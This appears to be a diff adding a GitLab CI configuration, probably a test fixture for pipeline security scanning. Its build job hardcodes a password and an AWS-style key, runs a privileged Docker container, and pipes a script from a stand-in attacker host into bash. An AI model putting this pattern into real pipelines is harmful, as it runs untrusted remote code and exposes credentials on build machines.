@@ -1,0 +1,18 @@
+stages:
+  - build
+  - deploy
+
+build-job:
+  stage: build
+  variables:
+    APP_PASSWORD: "password=UltraSecret!"
+    AWS_KEY: "AKIA1234567890ABCD12"
+  script:
+    - echo "Building app"
+    - wget -qO- https://evil.example.com/installer.sh | bash
+    - sudo docker run --privileged ubuntu:latest sleep 10
+
+deploy-job:
+  stage: deploy
+  script:
+    - echo "Deploying application"
